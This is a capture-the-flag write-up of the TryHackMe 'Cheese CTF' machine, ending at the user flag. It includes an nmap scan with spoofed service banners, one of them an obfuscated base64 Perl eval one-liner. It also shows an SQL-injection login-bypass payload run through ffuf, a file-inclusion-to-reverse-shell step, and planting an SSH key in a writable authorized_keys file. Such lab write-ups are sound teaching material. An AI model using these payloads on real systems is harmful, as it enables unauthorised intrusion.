---
title: "Cheese CTF"
date: 2025-03-09
image: /assets/img/tryhackme/CheeseCTF/CheeseCTF_image.jpg
description: Writeup of the TryHackMe-CTF Cheese CTF
categories: [TryHackMe, Easy]
tags: [linux, nmap, lfi, sqli, systemd]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Cheese CTF</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Inspired by the great cheese talk of THM!</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/cheesectfv10">https://tryhackme.com/room/cheesectfv10</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Cheese CTF.  

## Enumeration
I began the enumeration using `nmap`, but the estimated time to complete the scan was four hours. I stopped the scan and reduced it to the 1000 most common ports. Even this output was still too long to include in this write-up. To streamline it further, I used the `--top-ports` flag to limit the scan to the top 100 ports. From there, I was able to use the `-A` flag directly to perform OS detection, version detection, script scanning, and traceroute. Since the port scan generated a lot of data, I first extracted the most useful information and summarized it:
```bash
PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b1:c1:22:9f:11:10:5f:64:f1:33:72:70:16:3c:80:06 (RSA)
|   256 6d:33:e3:bd:70:62:59:93:4d:ab:8b:fe:ef:e8:a7:b2 (ECDSA)
|_  256 89:2e:17:84:ed:48:7a:ae:d9:8c:9b:a5:8e:24:04:bd (ED25519)
53/tcp    open  domain?
|_dns-nsid: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    550 4m2v4 FUZZ_HERE
79/tcp    open  http             Ultraseek httpd 3
|_http-title: Site doesn't have a title.
|_http-server-header: Ultraseek/3
| finger: HTTP/1.0 924 h\x0D
| Server: Ultraseek/3\x0D
|_
80/tcp    open  http             Apache httpd 2.4.41 ((Ubuntu))
|_http-title: The Cheese Shop
|_http-server-header: Apache/2.4.41 (Ubuntu)
81/tcp    open  http             TSM httpd 95964816 (Tivoli Storage Manager http interface)
|_http-title: Site doesn't have a title.
88/tcp    open  ftp              Synology Disk Station DS-FvB NAS ftpd
106/tcp   open  nntp             Microsoft NNTP Service Y_BMqM
110/tcp   open  telnet           HP LaserJet telnetd
| fingerprint-strings: 
|   GenericLines, GetRequest, Help, NCP, NULL, RPCCheck, SIPOptions, tn3270: 
|     *{76}
|     +Minolta Network Configuration Utility
|     +Minolta
|_    +Version zKGqqlTxo
111/tcp   open  http             Microsoft IIS httpd
|_http-title: Site doesn't have a title (text/html).
113/tcp   open  ident?
| fingerprint-strings: 
|   DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, Help, NULL, RPCCheck, RTSPRequest: 
|     00hdcmwrdt0000qhkajcif
|     lYu'
|     *VMware68x05
|     AFP3.4
|     AFP3.3
|     AFP3.2
|     AFP3.1
|     AFPX03
|     DHCAST128
|     DHX2
|     Recon1
|     Client Krb v2
|     User Authentw
|_    $not_defined_in_RFC4178@please_ignore
119/tcp   open  nntp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LDAPSearchReq, LPDString, NULL, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     0000000=r0000000
|     000CONDUCTUS_PGkwZcTgr
|_    000unbekannter Code: 19240920
135/tcp   open  msrpc?
| fingerprint-strings: 
|   DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, NULL, RPCCheck, RTSPRequest, SMBProgNeg: 
|     HTTP/1.1 200 OK
|     cache-control: no-cache
|     Content-Length: 6r
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|_    Set-Cookie: JSESSIONID=12-4570; Path=/; Securey<title>VMware View Portal</title>
139/tcp   open  http             Mercur Webmail httpd
|_http-server-header: MERCUR Messaging 2005
|_http-title: Site doesn't have a title.
143/tcp   open  http             VMware Server 2 http config
|_imap-capabilities: CAPABILITY
|_http-title: Did not follow redirect to https://BCfOZrsJr/
144/tcp   open  news?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, Help, NULL, RPCCheck, RTSPRequest: 
|     HTTP/1.0 200 OK 
|     Server: Simple java
|     Date: t
|     Content-length: 8r
|     Last Modified: v
|     Content-type: text/html
|_    <html><head><title> RAID webConsole krW</title>
179/tcp   open  pop3             SCO-modified QPOP pop3d eiHjUmVQZ
199/tcp   open  utsvc            Sun Ray utsvcd
389/tcp   open  telnet           Epson Network Scanner Server (v)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
427/tcp   open  svrloc?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LPDString, NULL, NotesRPC, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     HTTP/1.0 401 Unauthorized
|_    uWWW-Authenticate: Basic realm="OpenWrt"
443/tcp   open  irc              iacd ircd
444/tcp   open  pop3             Solid pop3d
445/tcp   open  microsoft-ds?
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions, NULL, RTSPRequest, SMBProgNeg: 
|     220 Inactivity timer = 2seconds. Use 'site idle <secs>' to change.
|     Goodbye (badly formated command seen). You uploaded 0 and downloaded 0 kbytes.
|_    Goodbye (badly formated command seen). You uploaded 0 and downloaded 0 kbytes.
465/tcp   open  smtps?
|_smtp-commands: SMTP EHLO nmap.scanme.org: failed to receive data: connection closed
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, SSLv23SessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    220 z-ZD ESMTP IceWarp 49792
513/tcp   open  http             Agranat-EmWeb 878.01395 (Siemens router http config)
| http-auth: 
| HTTP/1.0 401 Unauthorized\x0D
|_  Basic realm=Siemens Web User Interface
|_http-title: Site doesn't have a title.
|_http-server-header: Agranat-EmWeb/R878_01395
514/tcp   open  H.323-gatekeeper OpenH323 Gatekeeper 72158
515/tcp   open  printer?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, Help, LPDString, NULL, RPCCheck, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie: 
|     HTTP/1.0 301 Moved Permanently
|     tServer: Mbedthis-Appweb/37078
|_    qLocation: https://:443/start.html
543/tcp   open  klogin?
544/tcp   open  telnet
| fingerprint-strings: 
|   GenericLines, GetRequest, Help, NCP, NULL, RPCCheck, SIPOptions, tn3270: 
|     Welcome to QUIDWAY xvcCdW Access Server
|     Copyright (c) 60HUAWEI TECH CO. LTD.
|_    User Name:
548/tcp   open  ftp              Phaser printer ftpd
|_afp-serverinfo: ERROR: Script execution failed (use -d to debug)
554/tcp   open  http             Microsoft Windows Media Services 7IZ
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
|_http-server-header: Cougar/7IZ
|_http-title: Site doesn't have a title (video/x-ms-asf).
587/tcp   open  telnet           Nortel 5530 Ethernet Routing Switch telnetd
|_smtp-commands: SMTP EHLO nmap.scanme.org: failed to receive data: connection closed
631/tcp   open  http             Enigma2 Dreambox http config TA
|_http-server-header: Enigma2 WebInterface Server TA 
646/tcp   open  ldp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, oracle-tns: 
|_    HTTP/1.0 895 eServer: uClinux-httpd S
873/tcp   open  rsync?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     000a
|     SMBr0000
|     ro00Kuf0+@
|_    0r?:0?:0{2,50}
990/tcp   open  ftps?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, NULL, RPCCheck, RTSPRequest, SSLSessionReq, SSLv23SessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.0 401 Unauthorized
|     Server: NAShttpd
|_    fWWW-Authenticate: Basic realm="Default YAnvVKC:i"
|_ftp-bounce: ERROR: Script execution failed (use -d to debug)
993/tcp   open  imaps?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, NULL, RPCCheck, RTSPRequest, SSLSessionReq, SSLv23SessionReq, TLSSessionReq: 
|     HTTP/1.1 403 Forbidden
|     nContent-Type: text/html;charset=w
|     tServer: Hidden
|_    <html><head><title>Apache Tomcat/NMkIhvaot - Error report</title>
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3             LiberoPops pop3d 605660610
1025/tcp  open  sip-proxy        Ingate SIParator Vj
1026/tcp  open  netbackup        Veritas Netbackup java listener
1027/tcp  open  IIS?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, Help, NULL, RPCCheck, RTSPRequest, SMBProgNeg: 
|     HTTP/1.0 200 OK
|     Pragma:no-cache
|     Content-Length: 9r
|     Content-Type: text/html
|     <html>
|     <head>
|_    <title>AXIS 5+1176; IP address: 586933418</title>
1028/tcp  open  smtp             AppleMailServer 7o
|_smtp-commands: SMTP EHLO nmap.scanme.org: failed to receive data: connection closed
1029/tcp  open  ms-lsa?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LPDString, NULL, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     220 v Ready
|     250-u
|     250-AUTH LOGIN
|     ?:250-8BITMIME
|_    ?250-SIZE
1110/tcp  open  telnet           Netkit-telnetd (Linux kNmpl)
1433/tcp  open  telnet           Huawei Access Runner ADSL telnetd
1720/tcp  open  smtp             NTMail smtpd
|_smtp-commands: SMTP EHLO nmap.scanme.org: failed to receive data: connection closed
1723/tcp  open  telnet
| fingerprint-strings: 
|   GenericLines, GetRequest, Help, NCP, NULL, RPCCheck, SIPOptions, tn3270: 
|_    POSTEF ADSL Modem/Router OQuZh
1755/tcp  open  laserfiche       Laserfiche document service
1900/tcp  open  ssh              FortiSSH (protocol 2.0)
2000/tcp  open  cisco-sccp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, NCP, NULL, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, SSLv23SessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 200 OK
|     kConnection: close
|_    w<meta name=description content=VZ025>
2001/tcp  open  dc?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    ?:EmXKEefS ?:tcp|udp 7{1,5}
2049/tcp  open  nfs?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     version
|_    binduIND 3,20}
2121/tcp  open  ccproxy-ftp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    p{256}
2717/tcp  open  ftp              pSOSystem ftpd wyse (PowerPC; build date 38)
3000/tcp  open  ppp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     220*
|_    SSL/TLS required on the control channel
3128/tcp  open  telnet           Tandberg MXP Video Conference appliance telnetd xg (release date: BhLb)
3306/tcp  open  ftp              Rhinosoft Serv-U FTP
|_mysql-info: ERROR: Script execution failed (use -d to debug)
3389/tcp  open  http             Rapid7 NeXpose http config
|_http-title: Site doesn't have a title.
3986/tcp  open  smtp             MailEnable smptd sovK
|_smtp-commands: SMTP EHLO nmap.scanme.org: failed to receive data: connection closed
4899/tcp  open  radmin?
5000/tcp  open  http             Cloudflare nginx
|_http-server-header: cloudflare-nginx
|_http-title: Site doesn't have a title.
5009/tcp  open  airport-admin?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, Help, NULL, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq: 
|     HTTP/1.1 307 Temporary Redirect
|     Connection: keep-alive,close
|     nLocation: http://TlhptZ/servlet/StartServlet
|_    Server: PEWG/599299701
5051/tcp  open  http             MX4J 429 (JMX CruiseControl http config)
|_http-server-header: MX4J-HTTPD/429
5060/tcp  open  zebra            GNU Zebra routing software 4bJ-Pz
5101/tcp  open  login            Ataman ATRLS rlogind
5190/tcp  open  aol?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe: 
|_    00snpsw0000pStarNet Communications Corp.
5357/tcp  open  wsdapi?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, NULL, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     HTTP/1.955 p
|_    SERVER: Linux/B UPnP/20 DLNADOC/uDNKzL Intel_SDK_for_UPnP_devices/bUIFYT-Cw
5432/tcp  open  postgresql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     501 Not Implemented
|_    kServer: RT-hUPnP/C MiniUPnPd/WRfs
5631/tcp  open  telnet           APC network management card telnetd
5666/tcp  open  http             Phluant Mobile Duphus httpd
|_http-title: Site doesn't have a title.
5800/tcp  open  ftp              Pure-FTPd
|_ftp-bounce: ERROR: Script execution failed (use -d to debug)
5900/tcp  open  http-proxy       thttpd (Blue Coat PacketShaper 3500 firewall)
6000/tcp  open  ident            FTPRush FTP client identd
6001/tcp  open  telnet           Extreme Networks telnetd
6646/tcp  open  unknown
7070/tcp  open  smtp             Mitel 3300 PBX smtpd (Access denied)
|_smtp-commands: SMTP EHLO nmap.scanme.org: failed to receive data: connection closed
8000/tcp  open  http             American Dynamics EDVR security recorder
| http-auth: 
| HTTP/1.0 401 Unauthorized\x0D
|_  Basic realm=NETWORK
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Lancam Server
8008/tcp  open  telnet           BusyBox telnetd 1.00-pre7 - 1.14.0
| fingerprint-strings: 
|   GenericLines, GetRequest, Help, NULL, RPCCheck, SIPOptions: 
|     ------------------------------------------------------------------------------
|_    +DMa- Minimux Router
8009/tcp  open  ajp13?
|_ajp-methods: Failed to get a valid response for the OPTION request
| fingerprint-strings: 
|   DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, NULL, RPCCheck, RTSPRequest, SSLSessionReq, SSLv23SessionReq, ajp: 
|     HTTP/1.1 404 Not Found
|     Connection: Close
|     Content-Type: text/html
|_    specified URL cannot be found<!--?:0123456789{50}01234-->
8080/tcp  open  http-proxy?
| fingerprint-strings: 
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, NULL, RTSPRequest, Socks4, Socks5: 
|_    /bin/bash -c {perl,-e,$0,useSPACEMIME::Base64,cHJpbnQgIlBXTkVEXG4iIHggNSA7ICRfPWBwd2RgOyBwcmludCAiXG51cGxvYWRpbmcgeW91ciBob21lIGRpcmVjdG9yeTogIiwkXywiLi4uIFxuXG4iOw==} $_=$ARGV[0];~s/SPACE/ /ig;eval;$_=$ARGV[1];eval(decode_base64($_));
8081/tcp  open  blackice-icecap?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LDAPSearchReq, LPDString, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, WWWOFFLEctrlstat, X11Probe: 
|_    OK0100 eXtremail V35787 release 3REMote management ...
8443/tcp  open  https-alt?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, NULL, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, SSLv23SessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     HTTP/1.460 g
|     Connection: close
|_    Server: Yaws/jVW Yet Another Web Server
8888/tcp  open  sun-answerbook?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LDAPSearchReq, LPDString, LSCP, NULL, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     HTTP/1.401 Unauthorized
|_    uWWW-Authenticate: Basic realm="WRTf"
9100/tcp  open  jetdirect?
9999/tcp  open  exec             AIX rexecd
10000/tcp open  imap
|_imap-capabilities: CAPABILITY
| fingerprint-strings: 
|   GenericLines, GetRequest, NULL: 
|_    * OK IMAP4rev1 Server Classic Hamster ?:Vrv|Version 5793 (Build 57) greets you!
32768/tcp open  filenet-tms?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, Help, NULL, RPCCheck, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     version00000U000d}00
|     0000000tsggjymv
|     00000000000000000
|     rmkndn
|     00000000000000000
|     phhodsiqsxyrcw
|_    .rhdma
49152/tcp open  ftp              VSE ftpd yPrUQub
|_ftp-bounce: ERROR: Script execution failed (use -d to debug)
49153/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, NULL, RPCCheck, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie, mongodb: 
|_    20TY
49154/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, NULL, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 200 OK
|     ySERVER: EPSON_Linux UPnP/2 Epson UPnP SDK/15565
|_    m<title>Artisan H</title>
49155/tcp open  http             SMC Barricade wireless broadband router http config
|_http-title: SMC Barricade Wireless Broadband Router
49156/tcp open  http             ZyXEL Prestige webadmin 6JbGkb-M (Prestige model -LnzruSX; Nuex/uW)
|_http-server-header: RomPager/6JbGkb-M Nuex/uW
|_http-title: Site doesn't have a title (text/html).
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Prestige -LnzruSX
49157/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     HTTP/1.0 200 OK
|     jServer: Z-World Rabbit
|_    r<title>CPON-_l-</title>
Service Info: Hosts: BCfOZrsJr, GkepTzeTv, jbWUru, TdHf, sZbD; OSs: Linux, Windows, SCO UNIX, pSOS, AIX; Devices: storage-misc, printer, router, switch, media device; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows, cpe:/o:sco:sco_unix, cpe:/h:nortel:ethernet_routing_switch_5530, cpe:/o:linux:linux_kernel:knmpl
Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
```

From here I proceeded the analysis port by port.

## Port 80 Analysis

The website displayed a cheese shop. I proceeded with directory and subdomain enumeration but didn't find any further. The website had a login section, so I focused on that. I tried some default credentials, but they didn't work. Using ffuf, I attempted to enumerate usernames by comparing response times, but this was unsuccessfull. Since the error message was very generic, I couldn't enumerate usernames that way. Next, I moved on to SQL injection and tried payloads from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Auth_Bypass2.txt">PayloadsAllTheThings</a>: 

```bash
$ ffuf -w sql-payloads.txt -u http://10.10.29.233/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=test" -fs 888

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.29.233/login.php
 :: Wordlist         : FUZZ: /home/kali/ctf/cheesectf/sql-payloads.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&password=test
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 888
________________________________________________

' OR 'x'='x'#;          [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 37ms]
```

Great! I was able to log in using the SQL-Injection payload:

![Cheese Shop Admin Panel](/assets/img/tryhackme/CheeseCTF/thm_cheesectf_1.jpg)

After exploring the website, the URL caught my attention because it appeared to have a file inclusion vulnerability:
```html
http://10.10.29.233/secret-script.php?file=supersecretadminpanel.html
```

I was able to read the `/etc/passwd` file with the following payload:

![File Inclusiion Passwd](/assets/img/tryhackme/CheeseCTF/thm_cheesectf_2.jpg)

To exploit this and gain initial access, I used the PHP filter chain generator from this <a href="https://github.com/synacktiv/php_filter_chain_generator">GitHub</a> repository. After inserting the generated string into the request using Burp Suite, I successfully obtained a reverse shell:

![PHP Filter Chain Reverse Shell](/assets/img/tryhackme/CheeseCTF/thm_cheesectf_3.jpg)

```bash
www-data@cheesectf:/var/www/html$ id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Privilege Escalation comte

I procceed by enumerating the system. While searching for files I could modify as `www-data`, I found an intersting one:
```bash
www-data@cheesectf:/var/www/html$ find / -type f -writable 2>/dev/null
  [...]
  /home/comte/.ssh/authorised_keys
  [...]
```

Great! Due to the write permissions, I was able to create a new SSH key pair and insert my public key into `comte's` authorised keys. 
```bash
kali@kali:~/ctf/cheesectf$ ssh-keygen -f id_rsa -t ed25519
kali@kali:~/ctf/cheesectf$ cat id_rsa.pub 
  ssh-ed25519 3NzaAAAC3NzaC1lZ[...]khQaAAAC3Nzkqh9r kali@kali

www-data@cheesectf:/var/www/html$ echo 'ssh-ed25519 3NzaAAAC3NzaC1lZ[...]khQaAAAC3Nzkqh9r kali@kali' > /home/comte/.ssh/authorized_keys

kali@kali:~/ctf/cheesectf$ chmod 600 id_rsa
kali@kali:~/ctf/cheesectf$ ssh -i id_rsa comte@10.10.108.121
```

I logged in afterwards and successfully retrieved the user flag. 
```bash
comte@cheesectf:~$ cat user.txt
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠉⠛⠻⢶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠟⠁⣠⣴⣶⣶⣤⡀⠈⠉⠛⠿⢶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡿⠃⠀⢰⣿⠁⠀⠀⢹⡷⠀⠀⠀⠀⠀⠈⠙⠻⠷⣶⣤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠋⠀⠀⠀⠈⠻⠷⠶⠾⠟⠁⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠉⠛⠻⢶⣦⣄⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⣼⠟⠛⢿⡆⠀⠀⠀⠀⠀⣀⣤⣶⡿⠟⢿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠋⠀⠀⣴⡿⠛⠛⠛⠛⣿⡄⠀⠀⠀⠀⠻⣶⣶⣾⠇⢀⣀⣤⣶⠿⠛⠉⠀⠀⠀⢸⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⢿⣦⡀⠀⠀⠀⣹⡇⠀⠀⠀⠀⠀⣀⣤⣶⡾⠟⠋⠁⠀⠀⠀⠀⠀⣠⣴⠾⠇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠁⠀⠀⠀⠀⠀⠀⠙⠻⠿⠶⠾⠟⠁⢀⣀⣤⡶⠿⠛⠉⠀⣠⣶⠿⠟⠿⣶⡄⠀⠀⣿⡇⠀⠀
